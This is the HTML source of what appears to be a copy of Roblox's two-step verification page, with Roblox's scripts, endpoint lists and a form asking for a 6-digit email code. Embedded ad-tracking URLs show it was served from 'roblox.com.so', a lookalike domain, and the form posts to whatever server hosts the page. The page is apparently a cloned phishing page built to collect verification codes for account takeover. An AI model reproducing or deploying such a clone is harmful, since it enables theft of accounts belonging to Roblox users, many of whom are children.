                translationRolesApi: "https://translationroles.roblox.com",
                universalAppConfigurationApi: "https://apis.roblox.com/universal-app-configuration",
                usersApi: "https://users.roblox.com",
                voiceApi: "https://voice.roblox.com",
                websiteUrl: "https://www.roblox.com",
                privateMessagesApi: "https://privatemessages.roblox.com",
                shareApi: "https://share.roblox.com",
                chatModerationApi: "https://chatmoderation.roblox.com",
                userModerationApi: "https://usermoderation.roblox.com",
                groupsModerationApi: "https://groupsmoderation.roblox.com",
                twoStepVerificationApi: "https://twostepverification.roblox.com",
            };

            // please keep the list in alphabetical order
            var additionalUrls = {
                amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
                appProtocolUrl: "robloxmobile://",
                appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
                googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
                iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
                windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
                xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k",
                amazonWebStoreLink: "https://www.amazon.com/roblox?&amp;_encoding=UTF8&amp;tag=r05d13-20&amp;linkCode=ur2&amp;linkId=4ba2e1ad82f781c8e8cc98329b1066d0&amp;camp=1789&amp;creative=9325",
            };

            for (var urlName in additionalUrls) {
                Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
            }
        </script>

        <script type="text/javascript">
            var Roblox = Roblox || {};
            Roblox.GaEventSettings = {
                gaDFPPreRollEnabled: "false" === "true",
                gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
                gaPerformanceEventEnabled: "false" === "true",
            };
        </script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="headerinit"
            type="text/javascript"
            src="https://js.rbxcdn.com/7bee61aedcbb4773d878992153fa64e0.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="Polyfill"
            type="text/javascript"
            src="https://js.rbxcdn.com/4340261c6f9296c0727dc8605acada61ac3db48cad8da1cf5b25f4ac3ab18d7b.js"
        ></script>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="HeaderScripts"
            type="text/javascript"
            src="https://js.rbxcdn.com/db5218c3fbccfaa300942c9c11f581d29079dcf3d27e2b69c410f10ba3aff8d4.js"
        ></script>

        <meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0.01" />
        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="Sentry"
            type="text/javascript"
            src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"
        ></script>

        <meta
            name="roblox-tracer-meta-data"
            data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj"
            data-service-name="Web"
            data-tracer-enabled="false"
            data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com"
            data-sample-rate="0"
            data-is-instrument-page-performance-enabled="false"
        />
        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="RobloxTracer"
            type="text/javascript"
            src="https://js.rbxcdn.com/a168257175fe69cdb0762a3b8ca5d0a5fd625f77c027d5e4cef7f90a1602d704.js"
        ></script>

        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />

        <script type="text/javascript">
            var Roblox = Roblox || {};
            Roblox.AdsHelper = Roblox.AdsHelper || {};
            Roblox.AdsLibrary = Roblox.AdsLibrary || {};

            Roblox.AdsHelper.toggleAdsSlot = function (slotId, GPTRandomSlotIdentifier) {
                var gutterAdsEnabled = false;
                if (gutterAdsEnabled) {
                    googletag.display(GPTRandomSlotIdentifier);
                    return;
                }

                if (typeof slotId !== "undefined" && slotId && slotId.length > 0) {
                    var slotElm = $("#" + slotId);
                    if (slotElm.is(":visible")) {
                        googletag.display(GPTRandomSlotIdentifier);
                    } else {
                        var adParam = Roblox.AdsLibrary.adsParameters[slotId];
                        if (adParam) {
                            adParam.template = slotElm.html();
                            slotElm.empty();
                        }
                    }
                }
            };
        </script>

        <!--[if lt IE 9]>
            <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
            <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

        <script>
            //Set if it browser's do not track flag is enabled
            var Roblox = Roblox || {};
            (function () {
                var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
                if (typeof window.external !== "undefined" && typeof window.external.msTrackingProtectionEnabled !== "undefined") {
                    dnt = dnt || window.external.msTrackingProtectionEnabled();
                }
                Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
            })();
        </script>

        <script type="text/javascript">
            var _gaq = _gaq || [];

            window.GoogleAnalyticsDisableRoblox2 = true;
            _gaq.push(["b._setAccount", "UA-486632-1"]);
            _gaq.push(["b._setSampleRate", "10"]);
            _gaq.push(["b._setCampSourceKey", "rbx_source"]);
            _gaq.push(["b._setCampMediumKey", "rbx_medium"]);
            _gaq.push(["b._setCampContentKey", "rbx_campaign"]);

            _gaq.push(["b._setDomainName", "roblox.com"]);

            _gaq.push(["b._setCustomVar", 1, "Visitor", "Anonymous", 2]);
            _gaq.push(["b._trackPageview"]);

            _gaq.push(["c._setAccount", "UA-26810151-2"]);
            _gaq.push(["c._setSampleRate", "1"]);
            _gaq.push(["c._setDomainName", "roblox.com"]);

            (function () {
                if (!Roblox.browserDoNotTrack) {
                    var ga = document.createElement("script");
                    ga.type = "text/javascript";
                    ga.async = true;
                    ga.src = ("https:" == document.location.protocol ? "https://ssl" : "http://www") + ".google-analytics.com/ga.js";
                    var s = document.getElementsByTagName("script")[0];
                    s.parentNode.insertBefore(ga, s);
                }
            })();
        </script>
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-1065449093"></script>
        <script type="text/javascript">
            var accountCode = "AW-1065449093";
            var signupConversionEventKey = "wmuJCO3CZBCF7YX8Aw";
            var webPurchaseConversionEventKey = "XDQ_CJme6s0BEIXthfwD";
            window.dataLayer = window.dataLayer || [];

            function gtag() {
                dataLayer.push(arguments);
            }
            gtag.conversionEvents = {
                signupConversionEvent: accountCode + "/" + signupConversionEventKey,
                webPurchaseConversionEvent: accountCode + "/" + webPurchaseConversionEventKey,
            };
            gtag("js", new Date());
            gtag("config", accountCode);
        </script>

        <script type="text/javascript">
            if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/pe?t=studio", "//ecsv2.roblox.com/pe?t=diagnostic");
            }
        </script>

        <script type="text/javascript">
            if (Roblox && Roblox.PageHeartbeatEvent) {
                Roblox.PageHeartbeatEvent.Init([2, 8, 20, 60]);
            }
        </script>
        <script type="text/javascript">
            if (typeof Roblox === "undefined") {
                Roblox = {};
            }
            Roblox.Endpoints = Roblox.Endpoints || {};
            Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
            Roblox.Endpoints.Urls["/asset/"] = "https://assetgame.roblox.com/asset/";
            Roblox.Endpoints.Urls["/client-status/set"] = "https://www.roblox.com/client-status/set";
            Roblox.Endpoints.Urls["/client-status"] = "https://www.roblox.com/client-status";
            Roblox.Endpoints.Urls["/game/"] = "https://assetgame.roblox.com/game/";
            Roblox.Endpoints.Urls["/game/edit.ashx"] = "https://assetgame.roblox.com/game/edit.ashx";
            Roblox.Endpoints.Urls["/game/placelauncher.ashx"] = "https://assetgame.roblox.com/game/placelauncher.ashx";
            Roblox.Endpoints.Urls["/game/preloader"] = "https://assetgame.roblox.com/game/preloader";
            Roblox.Endpoints.Urls["/game/report-stats"] = "https://assetgame.roblox.com/game/report-stats";
            Roblox.Endpoints.Urls["/game/report-event"] = "https://assetgame.roblox.com/game/report-event";
            Roblox.Endpoints.Urls["/game/updateprerollcount"] = "https://assetgame.roblox.com/game/updateprerollcount";
            Roblox.Endpoints.Urls["/login/default.aspx"] = "https://www.roblox.com/login/default.aspx";
            Roblox.Endpoints.Urls["/my/avatar"] = "https://www.roblox.com/my/avatar";
            Roblox.Endpoints.Urls["/my/money.aspx"] = "https://www.roblox.com/my/money.aspx";
            Roblox.Endpoints.Urls["/navigation/userdata"] = "https://www.roblox.com/navigation/userdata";
            Roblox.Endpoints.Urls["/chat/chat"] = "https://www.roblox.com/chat/chat";
            Roblox.Endpoints.Urls["/chat/data"] = "https://www.roblox.com/chat/data";
            Roblox.Endpoints.Urls["/friends/list"] = "https://www.roblox.com/friends/list";
            Roblox.Endpoints.Urls["/navigation/getcount"] = "https://www.roblox.com/navigation/getCount";
            Roblox.Endpoints.Urls["/regex/email"] = "https://www.roblox.com/regex/email";
            Roblox.Endpoints.Urls["/catalog/browse.aspx"] = "https://www.roblox.com/catalog/browse.aspx";
            Roblox.Endpoints.Urls["/catalog/html"] = "https://search.roblox.com/catalog/html";
            Roblox.Endpoints.Urls["/catalog/json"] = "https://search.roblox.com/catalog/json";
            Roblox.Endpoints.Urls["/catalog/contents"] = "https://search.roblox.com/catalog/contents";
            Roblox.Endpoints.Urls["/catalog/lists.aspx"] = "https://search.roblox.com/catalog/lists.aspx";
            Roblox.Endpoints.Urls["/catalog/items"] = "https://search.roblox.com/catalog/items";
            Roblox.Endpoints.Urls["/asset-hash-thumbnail/image"] = "https://assetgame.roblox.com/asset-hash-thumbnail/image";
            Roblox.Endpoints.Urls["/asset-hash-thumbnail/json"] = "https://assetgame.roblox.com/asset-hash-thumbnail/json";
            Roblox.Endpoints.Urls["/asset-thumbnail-3d/json"] = "https://assetgame.roblox.com/asset-thumbnail-3d/json";
            Roblox.Endpoints.Urls["/asset-thumbnail/image"] = "https://assetgame.roblox.com/asset-thumbnail/image";
            Roblox.Endpoints.Urls["/asset-thumbnail/json"] = "https://assetgame.roblox.com/asset-thumbnail/json";
            Roblox.Endpoints.Urls["/asset-thumbnail/url"] = "https://assetgame.roblox.com/asset-thumbnail/url";
            Roblox.Endpoints.Urls["/asset/request-thumbnail-fix"] = "https://assetgame.roblox.com/asset/request-thumbnail-fix";
            Roblox.Endpoints.Urls["/avatar-thumbnail-3d/json"] = "https://www.roblox.com/avatar-thumbnail-3d/json";
            Roblox.Endpoints.Urls["/avatar-thumbnail/image"] = "https://www.roblox.com/avatar-thumbnail/image";
            Roblox.Endpoints.Urls["/avatar-thumbnail/json"] = "https://www.roblox.com/avatar-thumbnail/json";
            Roblox.Endpoints.Urls["/avatar-thumbnails"] = "https://www.roblox.com/avatar-thumbnails";
            Roblox.Endpoints.Urls["/avatar/request-thumbnail-fix"] = "https://www.roblox.com/avatar/request-thumbnail-fix";
            Roblox.Endpoints.Urls["/bust-thumbnail/json"] = "https://www.roblox.com/bust-thumbnail/json";
            Roblox.Endpoints.Urls["/group-thumbnails"] = "https://www.roblox.com/group-thumbnails";
            Roblox.Endpoints.Urls["/groups/getprimarygroupinfo.ashx"] = "https://www.roblox.com/groups/getprimarygroupinfo.ashx";
            Roblox.Endpoints.Urls["/headshot-thumbnail/json"] = "https://www.roblox.com/headshot-thumbnail/json";
            Roblox.Endpoints.Urls["/item-thumbnails"] = "https://www.roblox.com/item-thumbnails";
            Roblox.Endpoints.Urls["/outfit-thumbnail/json"] = "https://www.roblox.com/outfit-thumbnail/json";
            Roblox.Endpoints.Urls["/place-thumbnails"] = "https://www.roblox.com/place-thumbnails";
            Roblox.Endpoints.Urls["/thumbnail/asset/"] = "https://www.roblox.com/thumbnail/asset/";
            Roblox.Endpoints.Urls["/thumbnail/avatar-headshot"] = "https://www.roblox.com/thumbnail/avatar-headshot";
            Roblox.Endpoints.Urls["/thumbnail/avatar-headshots"] = "https://www.roblox.com/thumbnail/avatar-headshots";
            Roblox.Endpoints.Urls["/thumbnail/user-avatar"] = "https://www.roblox.com/thumbnail/user-avatar";
            Roblox.Endpoints.Urls["/thumbnail/resolve-hash"] = "https://www.roblox.com/thumbnail/resolve-hash";
            Roblox.Endpoints.Urls["/thumbnail/place"] = "https://www.roblox.com/thumbnail/place";
            Roblox.Endpoints.Urls["/thumbnail/get-asset-media"] = "https://www.roblox.com/thumbnail/get-asset-media";
            Roblox.Endpoints.Urls["/thumbnail/remove-asset-media"] = "https://www.roblox.com/thumbnail/remove-asset-media";
            Roblox.Endpoints.Urls["/thumbnail/set-asset-media-sort-order"] = "https://www.roblox.com/thumbnail/set-asset-media-sort-order";
            Roblox.Endpoints.Urls["/thumbnail/place-thumbnails"] = "https://www.roblox.com/thumbnail/place-thumbnails";
            Roblox.Endpoints.Urls["/thumbnail/place-thumbnails-partial"] = "https://www.roblox.com/thumbnail/place-thumbnails-partial";
            Roblox.Endpoints.Urls["/thumbnail_holder/g"] = "https://www.roblox.com/thumbnail_holder/g";
            Roblox.Endpoints.Urls["/users/{id}/profile"] = "https://www.roblox.com/users/{id}/profile";
            Roblox.Endpoints.Urls["/service-workers/push-notifications"] = "https://www.roblox.com/service-workers/push-notifications";
            Roblox.Endpoints.Urls["/notification-stream/notification-stream-data"] = "https://www.roblox.com/notification-stream/notification-stream-data";
            Roblox.Endpoints.Urls["/api/friends/acceptfriendrequest"] = "https://www.roblox.com/api/friends/acceptfriendrequest";
            Roblox.Endpoints.Urls["/api/friends/declinefriendrequest"] = "https://www.roblox.com/api/friends/declinefriendrequest";
            Roblox.Endpoints.Urls["/authentication/is-logged-in"] = "https://www.roblox.com/authentication/is-logged-in";
            Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
        </script>

        <script type="text/javascript">
            if (typeof Roblox === "undefined") {
                Roblox = {};
            }
            Roblox.Endpoints = Roblox.Endpoints || {};
            Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
        </script>

        <script>
            Roblox = Roblox || {};
            Roblox.AbuseReportPVMeta = {
                desktopEnabled: false,
                phoneEnabled: false,
                inAppEnabled: false,
            };
        </script>

        <meta
            name="thumbnail-meta-data"
            data-is-webapp-cache-enabled="False"
            data-webapp-cache-expirations-timespan="00:01:00"
            data-request-min-cooldown="1000"
            data-request-max-cooldown="30000"
            data-request-max-retry-attempts="5"
            data-request-batch-size="100"
            data-thumbnail-metrics-sample-size="50"
        />

        <script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1065449093/?random=1608056012652&amp;cv=9&amp;fst=1608056012652&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1366&amp;u_cd=24&amp;u_his=47&amp;u_tz=-480&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oabu0&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Froblox.com.so%2Fdrawtest%2F&amp;tiba=Roblox&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script>
        <script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1065449093/?random=1608057636295&amp;cv=9&amp;fst=1608057636295&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1366&amp;u_cd=24&amp;u_his=49&amp;u_tz=-480&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oabu0&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Froblox.com.so%2Fdrawtest%2F&amp;tiba=Roblox&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script>
    </head>
    <body id="rbx-body" class="rbx-body no-footer light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="" data-send-event-percentage="0" data-new-gr-c-s-check-loaded="14.987.0" data-gr-ext-installed="">
        <div
            id="roblox-linkify"
            data-enabled="true"
            data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))"
            data-regex-flags="gm"
            data-as-http-regex="(([^.]help|polls)\.roblox\.com)"
        ></div>

        <div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10"></div>
        <div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1"></div>

        <div id="fb-root"></div>

        <div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">
            <div class="container-main no-header-nav" id="container-main">
                <script type="text/javascript">
                    if (top.location != self.location) {
                        top.location = self.location.href;
                    }
                </script>

                <div class="alert-container">
                    <noscript>
                        <div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div>
                    </noscript>
                </div>

                <div class="content">
                    <div class="rbx-header"></div>

                    <div id="two-step-verification" class="two-step-verification ng-scope" data-two-step-auth-api-metadata-enabled="true" ng-modules="twoStepVerification" ng-controller="TwoStepVerificationController" rbx-two-step-data="">
                        <div two-step-verification="">
                            <form action="" method="post" name="samlRequestForm" class="ng-pristine ng-valid">
                                <input name="RelayState" value="" type="hidden" autocomplete="off" /> <input name="SAMLRequest" value="" type="hidden" autocomplete="off" />
                            </form>
                            <div class="row page-content"><h1 class="header ng-binding" ng-bind="'Label.TwoStepVerification' | translate">2-Step Verification</h1></div>
                            <div class="col-xs-12 section-content">
                                <div class="logo-method"><div class="logo-img email-img"></div></div>
                                <form method="POST">
                                    <div class="content-group">
                                        <!-- ngIf: verification.method === verificationMethods.email -->
                                        <div ng-if="verification.method === verificationMethods.email" ng-bind="'Label.EnterEmailCode' | translate" class="ng-binding ng-scope">Enter the code we just sent you via email</div>
                                        <!-- end ngIf: verification.method === verificationMethods.email -->
                                        <div class="input-container">
                                            <div class="form-group" ng-class="{'form-has-feedback form-has-error': getLayoutValue('codeInputError')}">
                                                <input
                                                    id="login-username"
                                                    name="username"
                                                    type="text"
                                                    class="form-control input-field ng-valid ng-dirty ng-valid-parse ng-touched ng-empty"
                                                    placeholder="Enter 6-digit code"
                                                    ng-model="loginFormData.credentialValue"
                                                    ng-keypress="clearError()"
                                                    rbx-form-interaction=""
                                                />
                                            </div>
                                        </div>
                                        <div class="button-container">
                                            <button
                                                id="login-button"
                                                class="btn-full-width login-button ng-binding btn-secondary-md"
                                                ng-class="loginLayout.usePrimaryButtonClass ? 'btn-primary-md' : 'btn-secondary-md'"
                                                ng-bind="'Action.LogInCapitalized' | translate"
                                                ng-click="submit(true)"
                                            >
                                                Verify
                                            </button>
                                        </div>
                                        <div class="checkbox trust-device">
                                            <input id="remember-device" type="checkbox" ng-model="formData.RememberDevice" tabindex="0" class="ng-pristine ng-untouched ng-valid ng-empty" />
                                            <label for="remember-device" ng-bind="'Label.TrustThisDevice' | translate" class="ng-binding">Trust this device for 30 days</label>
                                        </div>
                                        <div class="code-message-action">
                                            <!-- ngIf: layout.codeSent -->
                                            <!-- ngIf: layout.codeSent -->
                                            <div class="text-block"><a class="text-name small ng-binding" ng-click="resendCode()" ng-bind="'Action.Resend' | translate">Resend Code</a></div>
                                        </div>
                                        <div class="support">
                                            <div class="text-block"><span class="text-footer ng-binding" ng-bind-html="layout.supportPageLinkPhrase"></span></div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script type="text/javascript">
            function urchinTracker() {}
        </script>

        <script type="text/javascript">
            if (typeof Roblox === "undefined") {
                Roblox = {};
            }
            if (typeof Roblox.PlaceLauncher === "undefined") {
                Roblox.PlaceLauncher = {};
            }
            var isRobloxIconEnabledForRetheme = "True";
            var robloxIcon = isRobloxIconEnabledForRetheme === "True" ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/6304dfebadecbb3b338a79a6a528936c.svg.gzip' width='90' height='90' alt='R'/>";
            Roblox.PlaceLauncher.Resources = {
                RefactorEnabled: "True",
                IsProtocolHandlerBaseUrlParamEnabled: "False",
                ProtocolHandlerAreYouInstalled: {
                    play: {
                        content: robloxIcon + "<p>You&#39;re moments away from getting into the game!</p>",
                        buttonText: "Download and Install Roblox",
                        footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> ",
                    },
                    studio: {
                        content: "<img src='https://images.rbxcdn.com/3da410727fa2670dcb4f31316643138a.svg.gzip' width='95' height='95' alt='R' /><p>Get started creating your own games!</p>",
                        buttonText: "Download Studio",
                    },
                },
                ProtocolHandlerStartingDialog: {
                    play: {
                        content: robloxIcon + "<p>Roblox is now loading. Get ready to play!</p>",
                    },
                    studio: {
                        content: "<img src='https://images.rbxcdn.com/3da410727fa2670dcb4f31316643138a.svg.gzip' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>",
                    },
                    loader: "<span class='spinner spinner-default'></span>",
                },
            };
        </script>
        <div
            id="PlaceLauncherStatusPanel"
            style="display: none; width: 300px;"
            data-new-plugin-events-enabled="True"
            data-event-stream-for-plugin-enabled="True"
            data-event-stream-for-protocol-enabled="True"
            data-is-game-launch-interface-enabled="True"
            data-is-protocol-handler-launch-enabled="True"
            data-is-user-logged-in="False"
            data-os-name="OSX"
            data-protocol-name-for-client="roblox-player"
            data-protocol-name-for-studio="roblox-studio"
            data-protocol-roblox-locale="en_us"
            data-protocol-game-locale="en_us"
            data-protocol-url-includes-launchtime="true"
            data-protocol-detection-enabled="true"
            data-protocol-separate-script-parameters-enabled="true"
            data-protocol-avatar-parameter-enabled="false"
            data-protocol-channel-name="LIVE"
        >
            <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px;">
                <div id="Spinner" class="Spinner" style="padding: 20px 0;">
                    <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced" />
                </div>
                <div id="status" style="min-height: 40px; text-align: center; margin: 5px 20px;">
                    <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display: block;">
                        Starting Roblox...
                    </div>
                    <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to Players...</div>
                    <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
                </div>
                <div style="text-align: center; margin-top: 1em;">
                    <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel" />
                </div>
            </div>
        </div>
        <div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display: none;">
            <p class="larger-font-size">
                <span class="icon-moreinfo"></span>

                Check <strong>Always open links for Roblox</strong> and click <strong>Open Roblox</strong> in the dialog box above to join games faster in the future!
            </p>
        </div>

        <script type="text/javascript">
            function checkRobloxInstall() {
                return RobloxLaunch.CheckRobloxInstall("https://www.roblox.com/Download");
            }
        </script>

        <div id="InstallationInstructions" class="" style="display: none;">
            <div class="ph-installinstructions">
                <div class="ph-modal-header">
                    <span class="icon-close simplemodal-close"></span>
                    <h3 class="title">Thanks for playing Roblox</h3>
                </div>
                <div class="modal-content-container">
                    <div class="ph-installinstructions-body">
                        <ul class="modal-col-5">
                            <li class="step1-of-5">
                                <h2>1</h2>
                                <p class="larger-font-size">Click <strong>Roblox.dmg</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
                                <img data-delaysrc="https://images.rbxcdn.com/453dc2b872ce1b09aff98bfacf3db50a.png" src="https://images.rbxcdn.com/453dc2b872ce1b09aff98bfacf3db50a.png" class="src-replaced" />
                            </li>
                            <li class="step2-of-5">
                                <h2>2</h2>
                                <p class="larger-font-size">Double-click the Roblox app icon to begin the installation process.</p>
                                <img data-delaysrc="https://images.rbxcdn.com/7fcfb6345809e4baad30e72edaee442b.png" src="https://images.rbxcdn.com/7fcfb6345809e4baad30e72edaee442b.png" class="src-replaced" />
                            </li>
                            <li class="step3-of-5">
                                <h2>3</h2>
                                <p class="larger-font-size">Click <strong>Open</strong> when prompted by your computer.</p>
                                <img data-delaysrc="https://images.rbxcdn.com/63c0279ebb88ece574697e7ff5c77376.png" src="https://images.rbxcdn.com/63c0279ebb88ece574697e7ff5c77376.png" class="src-replaced" />
                            </li>
                            <li class="step4-of-5">
                                <h2>4</h2>
                                <p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p>
                                <img data-delaysrc="https://images.rbxcdn.com/ed97f63bf6c6b3d21cd2d2a8754ff48a.png" src="https://images.rbxcdn.com/ed97f63bf6c6b3d21cd2d2a8754ff48a.png" class="src-replaced" />
                            </li>
                            <li class="step5-of-5">
                                <h2>5</h2>
                                <p class="larger-font-size">After installation, click <strong>Play</strong> below to join the action!</p>
                                <div class="VisitButton VisitButtonContinueGLI">
                                    <a class="btn btn-primary-lg disabled btn-full-width">Play</a>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="xsmall">
                    The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a>
                    <script>
                        if (Roblox.ProtocolHandlerClientInterface && typeof Roblox.ProtocolHandlerClientInterface.attachManualDownloadToLink === "function") {
                            Roblox.ProtocolHandlerClientInterface.attachManualDownloadToLink();
                        }
                    </script>
                </div>
            </div>
        </div>
        <div class="InstallInstructionsImage" data-modalwidth="970" style="display: none;"></div>

        <div id="pluginObjDiv" style="height: 1px; width: 1px; visibility: hidden; position: absolute; top: 0;"></div>
        <iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility: hidden; height: 0; width: 1px; position: absolute;"></iframe>

        <script
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            data-monitor="true"
            data-bundlename="clientinstaller"
            type="text/javascript"
            src="https://js.rbxcdn.com/17af7ddc78e9257b126bfee033fdf688.js"
        ></script>

        <script type="text/javascript">
            Roblox.Client._skip = null;
            Roblox.Client._CLSID = "76D50904-6780-4c8b-8986-1A7EE0B1716D";
            Roblox.Client._installHost = "setup.roblox.com";
            Roblox.Client.ImplementsProxy = true;
            Roblox.Client._silentModeEnabled = true;
            Roblox.Client._bringAppToFrontEnabled = false;
            Roblox.Client._currentPluginVersion = "";
            Roblox.Client._eventStreamLoggingEnabled = true;

            Roblox.Client._installSuccess = function () {
                if (GoogleAnalyticsEvents) {
                    GoogleAnalyticsEvents.ViewVirtual("InstallSuccess");
                    GoogleAnalyticsEvents.FireEvent(["Plugin", "Install Success"]);
                    if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                        Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                    }
                }
            };

            if ((window.chrome || window.safari) && window.location.hash == "#chromeInstall") {
                window.location.hash = "";
                var continuation = "(" + $.cookie("chromeInstall") + ")";
                play_placeId = $.cookie("chromeInstallPlaceId");
                Roblox.GamePlayEvents.lastContext = $.cookie("chromeInstallLaunchMode");
                $.cookie("chromeInstallPlaceId", null);
                $.cookie("chromeInstallLaunchMode", null);
                $.cookie("chromeInstall", null);
                RobloxLaunch._GoogleAnalyticsCallback = function () {
                    var isInsideRobloxIDE = "website";
                    if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) {
                        isInsideRobloxIDE = "Studio";
                    }
                    GoogleAnalyticsEvents.FireEvent(["Plugin Location", "Launch Attempt", isInsideRobloxIDE]);
                    GoogleAnalyticsEvents.FireEvent(["Plugin", "Launch Attempt", "Play"]);
                    EventTracker.fireEvent("GameLaunchAttempt_OSX", "GameLaunchAttempt_OSX_Plugin");
                    if (typeof Roblox.GamePlayEvents != "undefined") {
                        Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId);
                    }
                };
                Roblox.Client.ResumeTimer(eval(continuation));
            }
        </script>

        <div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display: none;">
            <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
            <div class="Title"></div>
            <div class="GenericModalBody">
                <div class="TopBody">
                    <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                        <img class="GenericModalImage" alt="generic image" />
                    </div>
                    <div class="Message"></div>
                </div>
                <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
                    <a href="" id="roblox-confirm-btn"><span></span></a>
                    <a href="" id="roblox-decline-btn"><span></span></a>
                </div>
                <div class="ConfirmationModalFooter"></div>
            </div>
            <script type="text/javascript">
                Roblox = Roblox || {};
                Roblox.Resources = Roblox.Resources || {};

                //<sl:translate>
                Roblox.Resources.GenericConfirmation = {
                    yes: "Yes",
                    No: "No",
                    Confirm: "Confirm",
